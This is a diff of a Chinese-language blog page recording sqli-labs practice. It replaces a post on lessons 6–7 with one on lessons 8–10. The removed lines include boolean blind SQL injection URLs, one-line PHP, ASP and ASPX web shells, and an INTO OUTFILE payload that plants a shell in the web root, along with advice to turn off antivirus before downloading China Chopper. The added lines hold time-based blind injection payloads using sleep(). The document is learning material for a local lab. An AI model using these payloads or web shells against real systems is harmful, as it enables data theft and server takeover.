@@ -10,7 +10,7 @@
   
   <title>
     
-      sqli-labs-Less6~7 | Hexo
+      sqli-labs-Less8~10 | Hexo
     
   </title>
   <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
@@ -192,7 +192,7 @@
 </header>
 
     <div id="article-banner">
-  <h2>sqli-labs-Less6~7</h2>
+  <h2>sqli-labs-Less8~10</h2>
   <p class="post-date">2021-10-12</p>
   <div class="arrow-down">
     <a href="javascript:;"></a>
@@ -201,59 +201,36 @@
 <main class="app-body flex-box">
   <!-- Article START -->
   <article class="post-article">
-    <section class="markdown-content"><p>再接再厉，本期博客记录着我们又学到新知识和新工具，以下是关于Less6~7的相关内容。</p>
+    <section class="markdown-content"><p>上期我们学习了Bool型盲注，而只一次我们主要来学习<strong>时间盲注</strong>，就是通过<strong>if语句</strong>根据返回结果的时间长短来进行准确的判断。</p>
 <span id="more"></span>
-<h4 id="Less6">Less6</h4>
-<p>Less6与Less5同属于<strong>Bool型盲注</strong>，布尔盲注一般适用于页面没有回显字段(不支持联合查询)，且web页面返回True 或者 false，构造SQL语句，利用and，or等关键字来其后的语句 <code>true</code> 、 <code>false</code>使web页面返回true或者false，从而达到注入的目的来获取信息。</p>
-<p>Less5已经对所需使用的函数有了大致的解释，我在这里做了一个简单的整理。</p>
-<p>1、left()函数：<strong>select left(database(),1)=‘’；</strong> // left(a,b)从左侧截取a的前b位，正确则返回1，错误则返回会0</p>
-<p>2、regexp函数：<strong>select user() regexp ‘r’；</strong> // user()的结果是root，regexp为匹配root的正确表达式</p>
-<p>3、like函数：<strong>select user() like ‘r%’；</strong> // 匹配与regexp相似，区别是后面加个%</p>
-<p>4、substr(a,b,c) <strong>select substr(a,b,c)=‘’；</strong> substr(a,b,c)从位置b开始，截取a字符串c位长度</p>
-<p>5、ascii <strong>select ascii (‘’)；</strong> // 将某个字符串转化为ascii值</p>
-<p>6、<strong>chr(数字)</strong> 或者是<strong>ord(‘字母’)；</strong> // 使用python中的两个函数可以判断当前的ascil值是多少</p>
-<p>7、<strong>length(database())=‘’</strong> // 判断数据库字符串长度</p>
-<p>8、<strong>limit x,y</strong> 查询指定的数据库，其中x和y都表示数字，意思是查询从x开始y个数据库，起始为0.</p>
-<p>另外在加入一个新的方法，<strong>二分法</strong></p>
-<p>我们以Less6为对象</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-6/?id=1%27and%20ascii(substr((select%20schema_name%20from%20information_schema.schemata%20limit%205,1)1,1))%3E100--+</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/10/12/sqli-labs-Less6-7/ascii.png" alt></p>
-<p>其实就是通过ascii实现数字与英文的编码转化，这里是对查库的举例，后续步骤雷同。</p>
-<h4 id="ASCII码表">ASCII码表</h4>
-<p><img src="/2021/10/12/sqli-labs-Less6-7/ascii%E7%A0%81%E8%A1%A8.png" alt></p>
-<p>这只是现阶段学习所需的一部分，完整的话<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/ASCII/309296">ASCII_百度百科 (baidu.com)</a></p>
-<p>我们也可以在mysql终端实现码表</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select ascii(&#x27;&#x27;);</span><br></pre></td></tr></table></figure>
-<h4 id="Less7">Less7</h4>
-<p>在开始Less7的内容之前，我们再一次来理解SQL注入的内涵。</p>
-<p>首先，这里有一个小技巧，我们可以通过测试?id='来判断是否存在SQL注入。如果提示<strong>You have an error in your SQL syntax</strong>，那么就说明存在SQL注入。</p>
-<h5 id="1、测试注入点，对id语句进行猜测："><strong>1、测试注入点，对id语句进行猜测：</strong></h5>
-<p>单引号测试： id?=1’–+ 数据库报错<br>
-双引号测试： id=?1&quot; --+ 页面正常显示<br>
-通过这两条信息的对比，单引号是闭合条件之一</p>
-<p>带着单引号 ’ 继续猜测<br>
-单引号+括号测试： ?id=1’) --+ 数据库报错<br>
-单引号+双括号测试： ?id=1’)) --+ 页面正常显示<br>
-这里我们测试出了正确的闭合语句，<br>
-可以推断出后端的SQL语句大概是 select * from users where id = ((‘$id’))<br>
-(注释：这里直接猜测 单引号后面加上括号，是由于php脚本语言，能识别的解析变量的字比较少，主要就是 单引号、双引号、括号等)</p>
-<h5 id="2、into-outfile">2、into outfile</h5>
-<p>我们注入正确后，会看到画面出现如下：</p>
-<p><img src="/2021/10/12/sqli-labs-Less6-7/1433223.png" alt></p>
-<p>这就是导出文件字符型注入，所以这是要就很有必要先学习文件字符</p>
-<p>into outfile 写文件<br>
-用法：select’内容’into outfile ‘位置’; // 记得\<br>
-load_file() 读取本地文件<br>
-用法：select load_file(‘位置’);</p>
-<h5 id="3、通过导出文件获取数据库信息">3、通过导出文件获取数据库信息</h5>
-<p>这时候我们需要<strong>一句话木马</strong>和<strong>中国菜刀</strong>，前者是木马语言，后者是黑客工具。（注意：下载中国菜刀请先关闭安全程序，尤其是电脑自带的）</p>
-<p>php的一句话木马： <?php @eval($_POST['pass']);?><br>
-asp的一句话是：   &lt;%eval request (“pass”)%&gt;<br>
-aspx的一句话是：  &lt;%@ Page Language=“Jscript”%&gt; &lt;%eval(Request.Item[“pass”],“unsafe”);%&gt;</p>
-<p>操作流程：1.结合union联合查询语句将查询到的信息导入到一个文件中</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-7/?id=1%27))%20union%20select%201,2,%27%3C?php%20@eval($_POST[%27chopper%27]);?%3E%27%20into%20outfile%20%22C:\\wamp.64\\www\\sqli-labs-master\\Less-7\\1.php%22--+</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/10/12/sqli-labs-Less6-7/%E6%84%8F%E5%A4%96.png" alt></p>
-<p>2、用中国菜刀访问，因为存在一句话木马，所以输入localhost/sqil-labs-master/Less-7/1.php即可。</p>
+<h4 id="if函数">if函数</h4>
+<p>**if(candition,A,B)**如果条件condition为true，则执行语句A，否则执行语句B.</p>
+<p>在MySQL终端中可以如下使用：</p>
+<p><img src="/2021/10/12/sqli-labs-Less8-10/14.png" alt></p>
+<p>第一个，1&gt;2很明显是错误的，所以返回4；</p>
+<p>第二个，首先我们已经选择了security这个数据库，第一位是’s’，并且s的ASCII转化就是115，所以返回2表示正确。</p>
+<h4 id="Less8，时间盲注">Less8，时间盲注</h4>
+<p>Less8的学习和Less5之后基本相同，注入的方法可以采用上一期博客，这里我们主要补充第二种方法——<strong>时间盲注</strong>，进入学习画面。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost/sqli-labs-master/Less-8/?id=1&#x27;and if(length(database())=&#x27;8&#x27;,1,sleep(5))--+</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/10/12/sqli-labs-Less8-10/8-16340171441641.png" alt></p>
+<p>因为这里使用的数据库是security，长度就是8，所以浏览器直接执行，不需要延迟五秒。现在试试将8改为7，看看回显错误的时是否符合sleep(5)，延迟五秒。</p>
+<p><img src="/2021/10/12/sqli-labs-Less8-10/7-16340356569622.png" alt></p>
+<p>通过网络我们可以看到，load 5.04秒，说明我们if函数执行正确，该数据建库的长度不为7。</p>
+<p>再试试其他步骤：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-8/?id=1%27and%20if(substr((select%20column_name%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%27users%27%20limit%200,1),1,2)=%27ss%27,1,sleep(5))--+</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/10/12/sqli-labs-Less8-10/id.png" alt></p>
+<p><img src="/2021/10/12/sqli-labs-Less8-10/ss.png" alt></p>
+<p>通过上面在查表上的实操，发现也是符合预期的效果，后续多尝试直至熟练。</p>
+<h4 id="Less9-10">Less9-10</h4>
+<p>Less9我们用以下语句判断是否存在注入漏洞及验证SQL注入的正确方式。</p>
+<p>当存在注入漏洞时，可以使用延迟注入进行判断，此时若存在漏洞，则睡眠五秒后在返回结果。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-9/?id=1%27and%20sleep(5)--+</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/10/12/sqli-labs-Less8-10/sleep.png" alt></p>
+<p>最后判断SQL注入方式为?id=1’，后续其余的操作与Less8相同。</p>
+<p>Less10只是将Less9的单引号换成了双引号，其余均相同。</p>
+<h4 id="总结">总结</h4>
+<p>if函数判断SQL注入会比通过提示或者盲猜更明确。盲注属于猜解，使用脚本会更有针对性。</p>
+<p>实践是检验真理的唯一标准！！</p>
 </section>
     <!-- Tags START -->
     
@@ -263,20 +240,13 @@ aspx的一句话是：  &lt;%@ Page Language=“Jscript”%&gt; &lt;%eval(Reques
   <div class="nav-container">
     <!-- reverse left and right to put prev and next in a more logic postition -->
     
-      <a class="nav-left" href="/2021/10/06/sqli-labs-Less2-5/">
+      <a class="nav-left" href="/2021/10/12/sqli-labs-Less6-7/">
         <span class="nav-arrow">← </span>
         
-          sqli-labs-Less2~5
+          sqli-labs-Less6~7
         
       </a>
     
-    
-      <a class="nav-right" href="/2021/10/12/sqli-labs-Less8-10/">
-        
-          sqli-labs-Less8~10
-        
-        <span class="nav-arrow"> →</span>
-      </a>
     
   </div>
 
@@ -328,7 +298,7 @@ aspx的一句话是：  &lt;%@ Page Language=“Jscript”%&gt; &lt;%eval(Reques
   <div class="toc-main">
     <strong class="toc-title">Catalog</strong>
     
-      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#Less6"><span class="toc-nav-text">Less6</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#ASCII%E7%A0%81%E8%A1%A8"><span class="toc-nav-text">ASCII码表</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#Less7"><span class="toc-nav-text">Less7</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#1%E3%80%81%E6%B5%8B%E8%AF%95%E6%B3%A8%E5%85%A5%E7%82%B9%EF%BC%8C%E5%AF%B9id%E8%AF%AD%E5%8F%A5%E8%BF%9B%E8%A1%8C%E7%8C%9C%E6%B5%8B%EF%BC%9A"><span class="toc-nav-text">1、测试注入点，对id语句进行猜测：</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#2%E3%80%81into-outfile"><span class="toc-nav-text">2、into outfile</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#3%E3%80%81%E9%80%9A%E8%BF%87%E5%AF%BC%E5%87%BA%E6%96%87%E4%BB%B6%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF"><span class="toc-nav-text">3、通过导出文件获取数据库信息</span></a></li></ol></li></ol>
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#if%E5%87%BD%E6%95%B0"><span class="toc-nav-text">if函数</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#Less8%EF%BC%8C%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-nav-text">Less8，时间盲注</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#Less9-10"><span class="toc-nav-text">Less9-10</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-nav-text">总结</span></a></li></ol>
     
   </div>
 </aside>
@@ -338,7 +308,7 @@ aspx的一句话是：  &lt;%@ Page Language=“Jscript”%&gt; &lt;%eval(Reques
 
 <script>
   (function () {
-    var url = 'http://example.com/2021/10/12/sqli-labs-Less6-7/';
+    var url = 'http://example.com/2021/10/12/sqli-labs-Less8-10/';
     var banner = ''
     if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
       $('#article-banner').css({
